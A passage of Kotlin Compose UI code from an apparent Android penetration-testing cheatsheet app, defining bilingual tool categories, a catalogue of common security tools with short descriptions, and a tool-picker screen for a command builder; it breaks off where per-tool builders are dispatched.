package com.hackingcheatsheets.app.ui.components

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.widget.Toast
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.grid.GridCells
import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
import androidx.compose.foundation.lazy.grid.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.BasicTextField
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.TrendingUp
import androidx.compose.material.icons.filled.BugReport
import androidx.compose.material.icons.filled.Check
import androidx.compose.material.icons.filled.Clear
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material.icons.filled.DataObject
import androidx.compose.material.icons.filled.Fingerprint
import androidx.compose.material.icons.filled.Hub
import androidx.compose.material.icons.filled.Key
import androidx.compose.material.icons.filled.KeyboardArrowDown
import androidx.compose.material.icons.filled.KeyboardArrowUp
import androidx.compose.material.icons.filled.Lan
import androidx.compose.material.icons.filled.Public
import androidx.compose.material.icons.filled.Radar
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material.icons.filled.Search
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Share
import androidx.compose.material.icons.filled.SwapHoriz
import androidx.compose.material.icons.filled.Terminal
import androidx.compose.material.icons.filled.Visibility
import androidx.compose.material.icons.filled.Wifi
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Switch
import androidx.compose.material3.SwitchDefaults
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.SolidColor
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import org.json.JSONArray
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.hackingcheatsheets.app.data.AppLanguage
import com.hackingcheatsheets.app.data.Cheatsheet
import com.hackingcheatsheets.app.ui.theme.AccentBlue
import com.hackingcheatsheets.app.ui.theme.AccentEmerald
import com.hackingcheatsheets.app.ui.theme.AccentIndigo
import com.hackingcheatsheets.app.ui.theme.AccentPink
import com.hackingcheatsheets.app.ui.theme.AccentPurple
import com.hackingcheatsheets.app.ui.theme.AccentRose
import com.hackingcheatsheets.app.ui.theme.AccentTeal
import com.hackingcheatsheets.app.ui.theme.AccentYellow
import com.hackingcheatsheets.app.ui.theme.BackgroundDark
import com.hackingcheatsheets.app.ui.theme.BorderDark
import com.hackingcheatsheets.app.ui.theme.BorderLight
import com.hackingcheatsheets.app.ui.theme.CodeBlockBg
import com.hackingcheatsheets.app.ui.theme.CyberGreen
import com.hackingcheatsheets.app.ui.theme.ExploitRed
import com.hackingcheatsheets.app.ui.theme.SurfaceDark
import com.hackingcheatsheets.app.ui.theme.SurfaceVariantDark
import com.hackingcheatsheets.app.ui.theme.TerminalCyan
import com.hackingcheatsheets.app.ui.theme.TextMuted
import com.hackingcheatsheets.app.ui.theme.TextPrimary
import com.hackingcheatsheets.app.ui.theme.TextSecondary
import com.hackingcheatsheets.app.ui.theme.WarningOrange

// Tool category definition for command builder
enum class BuilderCategory(val titleTr: String, val titleEn: String, val icon: ImageVector, val color: Color) {
    ALL("Tümü", "All", Icons.Default.Terminal, CyberGreen),
    RECON("Ağ & Tarama", "Network & Scan", Icons.Default.Radar, TerminalCyan),
    WEB("Web & Fuzzing", "Web & Fuzzing", Icons.Default.Public, CyberGreen),
    AD("Active Directory", "Active Directory", Icons.Default.Lan, AccentPurple),
    PASSWORDS("Parola Kırma", "Password Cracking", Icons.Default.Key, AccentYellow),
    SNIFFING("Paket & Sniff", "Sniffing & Pcap", Icons.Default.Hub, AccentBlue),
    TUNNELING("Pivoting & Tünel", "Pivoting & Tunnel", Icons.Default.SwapHoriz, AccentIndigo),
    PRIVESC("Yetki Yükseltme", "PrivEsc", Icons.AutoMirrored.Filled.TrendingUp, WarningOrange),
    OSINT("Açık İstihbarat", "OSINT", Icons.Default.Visibility, AccentTeal),
    REVERSE("Tersine Mühendislik", "Reverse Eng", Icons.Default.BugReport, AccentPink),
    FORENSICS("Adli Bilişim", "Forensics", Icons.Default.Fingerprint, AccentRose),
    EXPLOITATION("İstismar & Shell", "Exploitation", Icons.Default.Terminal, ExploitRed)
}

// Set of cheatsheet IDs that are methodology, theoretical topics, checklists, templates or payloads (not CLI tools)
val NON_TOOL_IDS = setOf(
    "ad-attack-methodology", "attack-methodology", "attack-methodology-01-initial-access",
    "attack-methodology-02-enumeration", "attack-methodology-03-privilege-escalation",
    "attack-methodology-04-lateral-movement", "attack-methodology-05-persistence",
    "attack-methodology-06-defense-evasion", "attack-methodology-07-actions-objectives",
    "bug-bounty-methodology", "network-pentesting", "network-pentesting-mitm-attacks",
    "network-pentesting-network-enumeration", "network-pentesting-port-scanning",
    "network-pentesting-service-exploitation", "cloud-security", "cloud-security-aws-pentesting",
    "cloud-security-azure-pentesting", "cloud-security-gcp-pentesting",
    "container-security", "container-security-docker-pentesting", "container-security-kubernetes-pentesting",
    "mobile-security", "mobile-security-android-pentesting", "mobile-security-ios-pentesting",
    "linux-privesc", "windows-privesc", "social-engineering", "social-engineering-phishing",
    "social-engineering-pretexting", "iot-hacking", "iot-hacking-firmware-analysis",
    "iot-hacking-hardware-hacking", "blue-team", "blue-team-hardening", "blue-team-incident-response",
    "blue-team-log-analysis", "blue-team-siem-detection", "blue-team-sigma-rules",
    "blue-team-threat-hunting", "blue-team-yara-rules", "contributing", "readme",
    "reporting-bug-bounty-report-template", "reporting-executive-summary-template",
    "reporting-pentest-report-template", "ctf", "ctf-crypto-ctf", "ctf-forensics-ctf",
    "ctf-pwn-ctf", "ctf-reverse-engineering-ctf", "ctf-web-ctf",
    "payloads-command-injection", "payloads-deserialization", "payloads-graphql-injection",
    "payloads-lfi", "payloads-nosql-injection", "payloads-sqli", "payloads-ssti",
    "payloads-websocket-attacks", "payloads-xss", "wordlists", "api-security",
    "auth-bypass", "cache-poisoning", "cloudflare-bypass", "cors", "idor",
    "jwt-attacks", "lfi-rfi", "nosql-injection", "oauth-attacks", "open-redirect",
    "http-request-smuggling", "prototype-pollution", "race-conditions", "ssrf",
    "subdomain-takeover", "waf-bypass", "xxe", "osint", "osint-domain-ip-osint",
    "osint-email-osint", "osint-image-osint", "osint-people-search",
    "osint-social-media-osint", "github-dorking", "google-dorking",
    "kali-linux-tools", "linux-commands", "lolbas-gtfobins", "powershell",
    "ssh-tunneling", "strace-ltrace"
)

/**
 * Returns true if the cheatsheet corresponds to an actual executable CLI or GUI security tool.
 * Excludes attack methodologies, theory checklists, payload collections, and templates.
 */
fun isActualCliTool(toolId: String, category: String = ""): Boolean {
    val idLower = toolId.lowercase().trim()
    if (NON_TOOL_IDS.contains(idLower)) return false
    val catLower = category.lowercase().trim()
    if (catLower in listOf(
            "attack methodology", "blue team & defense", "reporting & guides",
            "ctf cheatsheets", "social engineering"
        )
    ) return false
    val nonToolPrefixes = listOf(
        "attack-methodology-", "blue-team-", "payloads-", "reporting-",
        "ctf-", "social-engineering-", "mobile-security-", "cloud-security-",
        "container-security-", "network-pentesting-", "iot-hacking-", "osint-"
    )
    if (nonToolPrefixes.any { idLower.startsWith(it) }) return false
    return true
}

// Tool definition for builder selection
data class BuilderToolItem(
    val id: String,
    val name: String,
    val category: BuilderCategory,
    val descriptionTr: String,
    val descriptionEn: String
)

val ALL_BUILDER_TOOLS = listOf(
    // 1. RECON & SCANNING
    BuilderToolItem("nmap", "Nmap", BuilderCategory.RECON, "Port ve zafiyet tarama motoru", "Network port & vulnerability scanner"),
    BuilderToolItem("rustscan", "RustScan", BuilderCategory.RECON, "Aşırı hızlı modern port tarayıcı", "Fastest port scanner piped into Nmap"),
    BuilderToolItem("masscan", "Masscan", BuilderCategory.RECON, "İnternet ölçeğinde asenkron tarama", "Asynchronous internet-scale scanner"),
    BuilderToolItem("naabu", "Naabu", BuilderCategory.RECON, "Hızlı ve güvenilir SYN/CONNECT tarayıcı", "Fast SYN/CONNECT port discovery"),
    BuilderToolItem("dnsx", "dnsx", BuilderCategory.RECON, "Çok iş parçacıklı DNS sorgulama", "High-throughput DNS resolution"),
    BuilderToolItem("subfinder", "Subfinder", BuilderCategory.RECON, "Pasif alt alan adı (subdomain) keşfi", "Passive subdomain discovery tool"),
    BuilderToolItem("amass", "Amass", BuilderCategory.RECON, "Derinlemesine DNS ve saldırı yüzeyi haritalama", "In-depth DNS enumeration & network mapping"),
    BuilderToolItem("dnsrecon", "DNSRecon", BuilderCategory.RECON, "Gelişmiş DNS keşif ve zone transfer aracı", "Advanced DNS reconnaissance & zone transfers"),

    // 2. WEB CONTENT & FUZZING
    BuilderToolItem("ffuf", "ffuf", BuilderCategory.WEB, "Hızlı web dizin ve parametre fuzzerı", "Fast web fuzzer for paths and parameters"),
    BuilderToolItem("gobuster", "Gobuster", BuilderCategory.WEB, "Dizin, DNS ve vhost kaba kuvveti", "Directory, DNS, and vhost brute-forcer"),
    BuilderToolItem("feroxbuster", "Feroxbuster", BuilderCategory.WEB, "Özyinelemeli hızlı içerik keşfi", "Fast, recursive content discovery"),
    BuilderToolItem("dirsearch", "dirsearch", BuilderCategory.WEB, "Gelişmiş web yolu tarayıcısı", "Advanced web path scanner"),
    BuilderToolItem("dirb", "DIRB", BuilderCategory.WEB, "Klasik web içerik ve dizin tarayıcı", "Classic web content scanner"),
    BuilderToolItem("httpx", "httpx", BuilderCategory.WEB, "Hızlı ve zengin HTTP servis yoklayıcı", "Fast and multi-purpose HTTP probe toolkit"),
    BuilderToolItem("nuclei", "Nuclei", BuilderCategory.WEB, "Şablon tabanlı otomatik zafiyet tarayıcı", "Fast template-based vulnerability scanner"),
    BuilderToolItem("nikto", "Nikto", BuilderCategory.WEB, "Web sunucu zafiyet tarayıcısı", "Web server vulnerability scanner"),
    BuilderToolItem("whatweb", "WhatWeb", BuilderCategory.WEB, "Web teknoloji ve sürüm tespiti", "Web technology fingerprinting"),
    BuilderToolItem("wfuzz", "Wfuzz", BuilderCategory.WEB, "Esnek web uygulama fuzzerı", "Flexible web app fuzzer"),
    BuilderToolItem("arjun", "Arjun", BuilderCategory.WEB, "Gizli HTTP parametre keşif motoru", "HTTP parameter discovery suite"),
    BuilderToolItem("dalfox", "Dalfox", BuilderCategory.WEB, "Gelişmiş XSS tarayıcısı ve parametre analizi", "Powerful XSS scanner and analyzer"),
    BuilderToolItem("gau", "GAU", BuilderCategory.WEB, "Arşivlerden (Wayback/OTX/CommonCrawl) URL toplama", "Fetch known URLs from web archives"),
    BuilderToolItem("katana", "Katana", BuilderCategory.WEB, "Yeni nesil web crawler ve headless spider", "Next-generation crawling and spidering framework"),
    BuilderToolItem("sqlmap", "SQLMap", BuilderCategory.WEB, "Otomatik SQL enjeksiyonu ve sömürü", "Automated SQL injection and DB takeover"),
    BuilderToolItem("wpscan", "WPScan", BuilderCategory.WEB, "WordPress güvenlik denetleyicisi", "WordPress vulnerability scanner"),
    BuilderToolItem("commix", "Commix", BuilderCategory.WEB, "Otomatik komut enjeksiyon aracı", "Automated command injection tester"),
    BuilderToolItem("jwt_tool", "jwt_tool", BuilderCategory.WEB, "JSON Web Token analiz ve manipülasyon kiti", "JWT testing and tampering toolkit"),
    BuilderToolItem("kiterunner", "Kiterunner", BuilderCategory.WEB, "API endpoint ve routing keşif motoru", "High-performance API route discovery suite"),
    BuilderToolItem("mitmproxy", "mitmproxy", BuilderCategory.WEB, "Etkileşimli HTTPS proxy ve trafik analizörü", "Interactive HTTPS proxy and packet interceptor"),
    BuilderToolItem("owasp-zap", "OWASP ZAP", BuilderCategory.WEB, "Açık kaynak dinamik web uygulama tarayıcısı", "Open-source web app vulnerability scanner"),
    BuilderToolItem("burp-suite", "Burp Suite", BuilderCategory.WEB, "Web güvenlik proxy ve zafiyet tarayıcısı", "Web security testing & vulnerability scanner"),
    BuilderToolItem("wafw00f", "wafw00f", BuilderCategory.WEB, "WAF (Web Güvenlik Duvarı) tespiti", "Web Application Firewall fingerprinting"),

    // 3. ACTIVE DIRECTORY & NETWORK
    BuilderToolItem("netexec", "NetExec (nxc)", BuilderCategory.AD, "Active Directory ve ağ protokol sömürüsü", "AD & multi-protocol exploitation"),
    BuilderToolItem("coercer", "Coercer", BuilderCategory.AD, "Windows kimlik doğrulama zorlama (coerce auth)", "Coerce Windows authentication automatically"),
    BuilderToolItem("rubeus", "Rubeus", BuilderCategory.AD, "Kerberos kötüye kullanım ve bilet alma", "Kerberos interaction and abuse toolkit"),
    BuilderToolItem("enum4linux-ng", "enum4linux-ng", BuilderCategory.AD, "Yeni nesil Windows/Samba numaralandırma", "Next-gen Samba and Windows enum"),
    BuilderToolItem("bloodhound", "BloodHound", BuilderCategory.AD, "Active Directory ilişki grafiği", "AD domain relationship graph collector"),
    BuilderToolItem("certipy", "Certipy", BuilderCategory.AD, "AD CS sertifika şablon zafiyetleri", "Active Directory Certificate Services"),
    BuilderToolItem("kerbrute", "Kerbrute", BuilderCategory.AD, "Kerberos kullanıcı ve parola püskürtme", "Kerberos pre-auth enum & spraying"),
    BuilderToolItem("evil-winrm", "Evil-WinRM", BuilderCategory.AD, "Windows uzaktan yönetim kabuğu", "Ultimate WinRM shell for hacking"),
    BuilderToolItem("responder", "Responder", BuilderCategory.AD, "LLMNR, NBT-NS ve MDNS zehirleyici", "LLMNR/NBT-NS poisoner and rogue auth"),

    // 4. PASSWORDS & CRACKING
    BuilderToolItem("hashcat", "Hashcat", BuilderCategory.PASSWORDS, "Dünyanın en hızlı GPU parola kırıcısı", "World's fastest GPU password cracker"),
    BuilderToolItem("john", "John The Ripper", BuilderCategory.PASSWORDS, "Gelişmiş çevrimdışı hash kırıcı", "Feature-rich offline password cracker"),
    BuilderToolItem("hydra", "Hydra", BuilderCategory.PASSWORDS, "Hızlı paralel ağ giriş kırıcısı", "Fast online network login brute-forcer"),
    BuilderToolItem("aircrack-ng", "Aircrack-ng", BuilderCategory.PASSWORDS, "802.11 WPA/WPA2 WEP anahtar kırıcı", "WiFi 802.11 WPA/WPA2 key cracker"),
    BuilderToolItem("cewl", "CeWL", BuilderCategory.PASSWORDS, "Özel kelime listesi üreteci", "Custom wordlist generator from web"),
    BuilderToolItem("name-that-hash", "name-that-hash", BuilderCategory.PASSWORDS, "Modern hash türü tespit aracı", "Modern hash identification engine"),

    // 5. PACKET & SNIFFING
    BuilderToolItem("tcpdump", "tcpdump", BuilderCategory.SNIFFING, "Ağ trafiği yakalama ve paket filtresi", "Network packet analyzer & capture"),
    BuilderToolItem("tshark", "tshark", BuilderCategory.SNIFFING, "Terminal tabanlı Wireshark ayrıştırıcı", "Terminal-based Wireshark dissector"),

    // 6. PIVOTING & TUNNELING
    BuilderToolItem("chisel", "Chisel", BuilderCategory.TUNNELING, "HTTP üzerinden hızlı TCP/UDP tüneli", "Fast TCP/UDP tunnel over HTTP"),
    BuilderToolItem("ligolo-ng", "Ligolo-ng", BuilderCategory.TUNNELING, "TUN arayüzü ile modern pivotlama", "Modern pivoting using TUN interfaces"),
    BuilderToolItem("netcat", "Netcat (nc)", BuilderCategory.TUNNELING, "İsviçre çakısı ağ bağlantı ve port dinleyici", "Networking utility for read/write over connections"),
    BuilderToolItem("proxychains", "Proxychains", BuilderCategory.TUNNELING, "TCP bağlantılarını proxy zincirine aktarma", "Redirect TCP connections through proxies"),
    BuilderToolItem("sshuttle", "sshuttle", BuilderCategory.TUNNELING, "SSH üzerinden şeffaf VPN tüneli", "Transparent proxy VPN over SSH"),

    // 7. PRIVESC
    BuilderToolItem("peass-ng", "PEASS-ng", BuilderCategory.PRIVESC, "Linux ve Windows yetki yükseltme taraması", "Privilege escalation scanner suite"),
    BuilderToolItem("mimikatz", "Mimikatz", BuilderCategory.PRIVESC, "Windows bellekten kimlik bilgisi çekme", "Extract plaintexts, hashes from memory"),
    BuilderToolItem("pypykatz", "pypykatz", BuilderCategory.PRIVESC, "LSASS dökümü ve hash ayrıştırıcı", "Pure Python Mimikatz implementation"),

    // 8. OSINT
    BuilderToolItem("theharvester", "theHarvester", BuilderCategory.OSINT, "E-posta, alan adı ve kişi istihbaratı", "E-mails, subdomains, and names OSINT"),
    BuilderToolItem("sherlock", "Sherlock", BuilderCategory.OSINT, "Sosyal medya kullanıcı adı avcısı", "Hunt social media accounts by username"),
    BuilderToolItem("gitleaks", "Gitleaks", BuilderCategory.OSINT, "Git depolarında ifşa olan anahtar taraması", "Scan git repos for leaked secrets"),
    BuilderToolItem("trufflehog", "TruffleHog", BuilderCategory.OSINT, "Git depolarında gizli anahtar taraması", "Find leaked secrets and API keys"),

    // 9. REVERSE ENGINEERING & EXPLOIT
    BuilderToolItem("searchsploit", "Searchsploit", BuilderCategory.REVERSE, "Çevrimdışı Exploit-DB arama aracı", "Offline Exploit-DB search utility"),
    BuilderToolItem("checksec", "checksec", BuilderCategory.REVERSE, "İkili dosya güvenlik koruma denetimi", "Check binary mitigations (ASLR, NX)"),
    BuilderToolItem("radare2", "Radare2 (rabin2)", BuilderCategory.REVERSE, "İkili dosya sembol ve string analizi", "Binary info, symbols, and strings extraction"),
    BuilderToolItem("binwalk", "Binwalk", BuilderCategory.FORENSICS, "Firmware ve gömülü dosya analizörü", "Firmware analysis and extraction tool"),
    BuilderToolItem("exiftool", "ExifTool", BuilderCategory.FORENSICS, "Dosya üst veri (metadata) okuyucu", "Read and write meta information in files"),
    BuilderToolItem("volatility", "Volatility", BuilderCategory.FORENSICS, "Bellek adli bilişim analiz çerçevesi", "Advanced memory forensics framework"),
    BuilderToolItem("msfvenom", "Msfvenom", BuilderCategory.EXPLOITATION, "Metasploit payload ve kabuk kod derleyici", "Metasploit standalone payload generator")
)

@Composable
fun CommandBuilderView(
    language: AppLanguage,
    allCheatsheets: List<Cheatsheet> = emptyList(),
    initialToolId: String = "nmap",
    modifier: Modifier = Modifier
) {
    var selectedToolId by remember { mutableStateOf(initialToolId) }
    var selectedCategory by remember { mutableStateOf(BuilderCategory.ALL) }
    var searchQuery by remember { mutableStateOf("") }
    var isToolSelectorOpen by remember { mutableStateOf(false) }

    // Merge ALL_BUILDER_TOOLS with actual CLI tools from allCheatsheets
    val availableTools = remember(allCheatsheets) {
        val list = ALL_BUILDER_TOOLS.toMutableList()
        allCheatsheets.forEach { cs ->
            val slug = cs.id.lowercase().replace("_", "-").trim()
            if (isActualCliTool(cs.id, cs.category)) {
                if (list.none { it.id == slug || it.id.equals(cs.id, ignoreCase = true) }) {
                    val cat = when (cs.category.lowercase()) {
                        "recon & scanning" -> BuilderCategory.RECON
                        "web security & api" -> BuilderCategory.WEB
                        "active directory" -> BuilderCategory.AD
                        "password cracking" -> BuilderCategory.PASSWORDS
                        "wireless & network" -> BuilderCategory.SNIFFING
                        "pivoting & tunneling" -> BuilderCategory.TUNNELING
                        "privilege escalation" -> BuilderCategory.PRIVESC
                        "osint" -> BuilderCategory.OSINT
                        "reverse engineering" -> BuilderCategory.REVERSE
                        "forensics", "digital forensics" -> BuilderCategory.FORENSICS
                        "exploitation", "exploitation & shells" -> BuilderCategory.EXPLOITATION
                        else -> BuilderCategory.ALL
                    }
                    val cleanTitle = cs.title
                        .replace(" Cheatsheet", "")
                        .replace(" - Complete Cheatsheet", "")
                        .trim()
                    val descTr = cs.descriptionTr?.ifBlank { cs.description ?: "" } ?: cs.description ?: ""
                    val descEn = cs.description ?: cs.descriptionTr ?: ""
                    list.add(
                        BuilderToolItem(
                            id = cs.id,
                            name = cleanTitle,
                            category = cat,
                            descriptionTr = descTr,
                            descriptionEn = descEn
                        )
                    )
                }
            }
        }
        list
    }

    val currentTool = availableTools.firstOrNull { it.id == selectedToolId }
        ?: availableTools.firstOrNull()
        ?: ALL_BUILDER_TOOLS[0]

    // Filter tools by category and search
    val filteredTools = availableTools.filter { tool ->
        val matchesCategory = selectedCategory == BuilderCategory.ALL || tool.category == selectedCategory
        val matchesSearch = searchQuery.isBlank() ||
                tool.name.lowercase().contains(searchQuery.lowercase().trim()) ||
                tool.id.lowercase().contains(searchQuery.lowercase().trim()) ||
                tool.descriptionTr.lowercase().contains(searchQuery.lowercase().trim()) ||
                tool.descriptionEn.lowercase().contains(searchQuery.lowercase().trim())
        matchesCategory && matchesSearch
    }

    Column(modifier = modifier.fillMaxWidth()) {
        // Legal Disclaimer Banner
        LegalDisclaimerBanner(language = language)

        Spacer(modifier = Modifier.height(10.dp))

        // Tool Selector Header Card
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .clickable { isToolSelectorOpen = !isToolSelectorOpen },
            colors = CardDefaults.cardColors(containerColor = SurfaceDark),
            shape = RoundedCornerShape(12.dp),
            border = CardDefaults.outlinedCardBorder().copy(
                brush = SolidColor(if (isToolSelectorOpen) CyberGreen else BorderDark)
            )
        ) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(12.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                    Box(
                        modifier = Modifier
                            .size(38.dp)
                            .clip(RoundedCornerShape(8.dp))
                            .background(currentTool.category.color.copy(alpha = 0.15f))
                            .border(1.dp, currentTool.category.color.copy(alpha = 0.35f), RoundedCornerShape(8.dp)),
                        contentAlignment = Alignment.Center
                    ) {
                        Icon(
                            imageVector = currentTool.category.icon,
                            contentDescription = currentTool.name,
                            tint = currentTool.category.color,
                            modifier = Modifier.size(20.dp)
                        )
                    }

                    Spacer(modifier = Modifier.width(10.dp))

                    Column {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Text(
                                text = currentTool.name,
                                style = MaterialTheme.typography.titleMedium,
                                fontWeight = FontWeight.Bold,
                                color = TextPrimary
                            )
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(
                                text = currentTool.category.titleTr.uppercase(),
                                fontSize = 9.sp,
                                fontFamily = FontFamily.Monospace,
                                color = currentTool.category.color
                            )
                        }
                        Text(
                            text = if (language == AppLanguage.TR) currentTool.descriptionTr else currentTool.descriptionEn,
                            style = MaterialTheme.typography.bodySmall,
                            color = TextSecondary,
                            maxLines = 1
                        )
                    }
                }

                Row(verticalAlignment = Alignment.CenterVertically) {
                    Box(
                        modifier = Modifier
                            .clip(RoundedCornerShape(6.dp))
                            .background(SurfaceVariantDark)
                            .border(1.dp, BorderDark, RoundedCornerShape(6.dp))
                            .padding(horizontal = 8.dp, vertical = 4.dp)
                    ) {
                        Text(
                            text = if (language == AppLanguage.TR) "Araç Seç" else "Select Tool",
                            fontSize = 11.sp,
                            fontFamily = FontFamily.Monospace,
                            fontWeight = FontWeight.Bold,
                            color = CyberGreen
                        )
                    }
                    Spacer(modifier = Modifier.width(4.dp))
                    Icon(
                        imageVector = if (isToolSelectorOpen) Icons.Default.KeyboardArrowUp else Icons.Default.KeyboardArrowDown,
                        contentDescription = "Toggle Picker",
                        tint = TextMuted,
                        modifier = Modifier.size(20.dp)
                    )
                }
            }
        }

        // Expandable Tool Picker Drawer / Grid
        AnimatedVisibility(visible = isToolSelectorOpen) {
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(top = 10.dp)
                    .background(SurfaceDark, RoundedCornerShape(12.dp))
                    .border(1.dp, BorderDark, RoundedCornerShape(12.dp))
                    .padding(12.dp)
            ) {
                // Search Input inside picker
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .clip(RoundedCornerShape(8.dp))
                        .background(SurfaceVariantDark)
                        .border(1.dp, BorderDark, RoundedCornerShape(8.dp))
                        .padding(horizontal = 10.dp, vertical = 7.dp)
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(imageVector = Icons.Default.Search, contentDescription = "Search", tint = CyberGreen, modifier = Modifier.size(16.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        BasicTextField(
                            value = searchQuery,
                            onValueChange = { searchQuery = it },
                            modifier = Modifier.weight(1f),
                            textStyle = MaterialTheme.typography.bodyMedium.copy(color = TextPrimary),
                            cursorBrush = SolidColor(CyberGreen),
                            singleLine = true,
                            decorationBox = { innerTextField ->
                                if (searchQuery.isEmpty()) {
                                    Text(
                                        text = if (language == AppLanguage.TR) "Araç ara (örn: masscan, nikto, wpscan, mimikatz)..." else "Search tools...",
                                        color = TextMuted,
                                        fontSize = 12.sp
                                    )
                                }
                                innerTextField()
                            }
                        )
                        if (searchQuery.isNotEmpty()) {
                            IconButton(onClick = { searchQuery = "" }, modifier = Modifier.size(18.dp)) {
                                Icon(imageVector = Icons.Default.Clear, contentDescription = "Clear", tint = TextMuted, modifier = Modifier.size(14.dp))
                            }
                        }
                    }
                }

                Spacer(modifier = Modifier.height(10.dp))

                // Category Chips Carousel
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .horizontalScroll(rememberScrollState()),
                    horizontalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    BuilderCategory.entries.forEach { cat ->
                        val isSelected = selectedCategory == cat
                        Box(
                            modifier = Modifier
                                .clip(RoundedCornerShape(8.dp))
                                .background(if (isSelected) cat.color.copy(alpha = 0.2f) else SurfaceVariantDark)
                                .border(1.dp, if (isSelected) cat.color else BorderDark, RoundedCornerShape(8.dp))
                                .clickable { selectedCategory = cat }
                                .padding(horizontal = 10.dp, vertical = 6.dp)
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(
                                    imageVector = cat.icon,
                                    contentDescription = cat.titleTr,
                                    tint = if (isSelected) cat.color else TextMuted,
                                    modifier = Modifier.size(13.dp)
                                )
                                Spacer(modifier = Modifier.width(5.dp))
                                Text(
                                    text = if (language == AppLanguage.TR) cat.titleTr else cat.titleEn,
                                    fontSize = 11.sp,
                                    fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Normal,
                                    color = if (isSelected) cat.color else TextSecondary
                                )
                            }
                        }
                    }
                }

                Spacer(modifier = Modifier.height(12.dp))

                Text(
                    text = if (language == AppLanguage.TR) "MEVCUT ARAÇLAR (${filteredTools.size})" else "AVAILABLE TOOLS (${filteredTools.size})",
                    fontSize = 10.5.sp,
                    fontFamily = FontFamily.Monospace,
                    fontWeight = FontWeight.Bold,
                    color = TextMuted
                )

                Spacer(modifier = Modifier.height(6.dp))

                // Scrollable Grid of Tools (Fixed height for drawer)
                Box(modifier = Modifier.height(280.dp).fillMaxWidth()) {
                    LazyVerticalGrid(
                        columns = GridCells.Fixed(2),
                        horizontalArrangement = Arrangement.spacedBy(8.dp),
                        verticalArrangement = Arrangement.spacedBy(8.dp),
                        modifier = Modifier.fillMaxSize()
                    ) {
                        items(filteredTools, key = { it.id }) { tool ->
                            val isSelected = tool.id == selectedToolId
                            Card(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .clickable {
                                        selectedToolId = tool.id
                                        isToolSelectorOpen = false
                                    },
                                colors = CardDefaults.cardColors(
                                    containerColor = if (isSelected) tool.category.color.copy(alpha = 0.15f) else SurfaceVariantDark
                                ),
                                shape = RoundedCornerShape(8.dp),
                                border = CardDefaults.outlinedCardBorder().copy(
                                    brush = SolidColor(if (isSelected) tool.category.color else BorderDark)
                                )
                            ) {
                                Row(
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .padding(8.dp),
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    Box(
                                        modifier = Modifier
                                            .size(24.dp)
                                            .clip(RoundedCornerShape(4.dp))
                                            .background(tool.category.color.copy(alpha = 0.2f)),
                                        contentAlignment = Alignment.Center
                                    ) {
                                        Icon(
                                            imageVector = tool.category.icon,
                                            contentDescription = null,
                                            tint = tool.category.color,
                                            modifier = Modifier.size(13.dp)
                                        )
                                    }
                                    Spacer(modifier = Modifier.width(6.dp))
                                    Column(modifier = Modifier.weight(1f)) {
                                        Text(
                                            text = tool.name,
                                            fontSize = 11.5.sp,
                                            fontWeight = FontWeight.SemiBold,
                                            color = if (isSelected) tool.category.color else TextPrimary,
                                            maxLines = 1
                                        )
                                        Text(
                                            text = if (language == AppLanguage.TR) tool.descriptionTr else tool.descriptionEn,
                                            fontSize = 9.5.sp,
                                            color = TextMuted,
                                            maxLines = 1
                                        )
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(14.dp))

        // RENDER ACTIVE TOOL BUILDER
        when (selectedToolId) {
            "nmap" -> NmapBuilder(language)
            "rustscan" -> RustScanBuilder(language)
